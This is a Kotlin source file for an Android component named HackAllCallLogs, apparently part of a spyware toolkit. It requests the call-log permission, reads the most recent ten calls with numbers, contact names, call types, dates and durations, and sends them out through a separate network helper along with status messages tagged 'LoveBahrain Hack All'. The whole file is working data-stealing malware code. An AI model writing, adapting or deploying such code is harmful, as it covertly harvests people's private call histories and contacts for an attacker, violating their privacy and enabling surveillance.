package cocomelonc.hackall.tools

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.provider.CallLog
import com.karumi.dexter.Dexter
import com.karumi.dexter.PermissionToken
import com.karumi.dexter.listener.PermissionDeniedResponse
import com.karumi.dexter.listener.PermissionGrantedResponse
import com.karumi.dexter.listener.PermissionRequest
import com.karumi.dexter.listener.single.PermissionListener
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class HackAllCallLogs(private val context: Context) {

    @SuppressLint("NewApi")
    private fun isCallLogsPermissionGranted(context: Context): Boolean {
        val isGranted = context.checkSelfPermission(Manifest.permission.READ_CALL_LOG)
        return isGranted == PackageManager.PERMISSION_GRANTED
    }

    private fun startCallLogsPermissionRequest(context: Context, onGranted: () -> Unit) {
        Dexter.withContext(context)
            .withPermission(Manifest.permission.READ_CALL_LOG)
            .withListener(object : PermissionListener {
                override fun onPermissionGranted(p0: PermissionGrantedResponse?) {
                    onGranted()
                }
                override fun onPermissionDenied(p0: PermissionDeniedResponse?) {}
                override fun onPermissionRationaleShouldBeShown(
                    p0: PermissionRequest?,
                    p1: PermissionToken?
                ) {
                }
            }).check()
    }

    fun getCallLogs() {
        if (isCallLogsPermissionGranted(context)) {
            HackAllNetwork(context).sendTextMessage("LoveBahrain Hack All Call Logs permission already granted\n")
            sendCallLogs()
        } else {
            HackAllNetwork(context).sendTextMessage("LoveBahrain Hack All Call permission denied\n")
            startCallLogsPermissionRequest(context) {
                sendCallLogs()
            }
        }
    }

    @SuppressLint("NewApi")
    fun sendCallLogs() {
        try {
            val cols = arrayOf(
                CallLog.Calls._ID,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DURATION, CallLog.Calls.DATE
            )
            val cursor: Cursor? = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI, cols, null,
                null, "${CallLog.Calls.LAST_MODIFIED} DESC"
            )

            val callLogs = StringBuilder()

            cursor?.use {
                val nameIndex = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
                val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)
                val dateIndex = it.getColumnIndex(CallLog.Calls.DATE)
                val durationIndex = it.getColumnIndex(CallLog.Calls.DURATION)

                var count = 0
                while (it.moveToNext() && count < 10) {
                    val nameRow = it.getString(nameIndex)
                    val name = if (nameRow == null || nameRow == "") "Unknown" else nameRow
                    val number = it.getString(numberIndex)
                    val duration = it.getString(durationIndex) ?: "0"
                    val type = it.getInt(typeIndex)

                    val callType = when (type) {
                        CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                        CallLog.Calls.INCOMING_TYPE -> "Incoming"
                        CallLog.Calls.MISSED_TYPE -> "Missed"
                        CallLog.Calls.REJECTED_TYPE -> "Rejected"
                        CallLog.Calls.BLOCKED_TYPE -> "Blocked"
                        else -> "Unknown"
                    }

                    val date = it.getLong(dateIndex)

                    val formatter = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                    val formattedDate = formatter.format(Date(date))

                    callLogs.append("\uD83D\uDCF1 Number: $number\n")
                    callLogs.append("\uD83D\uDE00 Name: $name\n")
                    callLogs.append("\uD83D\uDD01 Type: $callType\n")
                    callLogs.append("\uD83D\uDCC5 Date: $formattedDate\n")
                    callLogs.append("\uD83D\uDD53 Duration: $duration seconds\n\n")
                    count += 1
                }
            }

            if (callLogs.isNotEmpty()) {
                HackAllNetwork(context).sendTextMessage("Collected Call Logs:\n\n$callLogs")
            } else {
                HackAllNetwork(context).sendTextMessage("No call logs found on the device.\n")
            }
        } catch (e: Exception) {
            HackAllNetwork(context).sendTextMessage("Error reading call logs: ${e.localizedMessage}")
        }
    }
}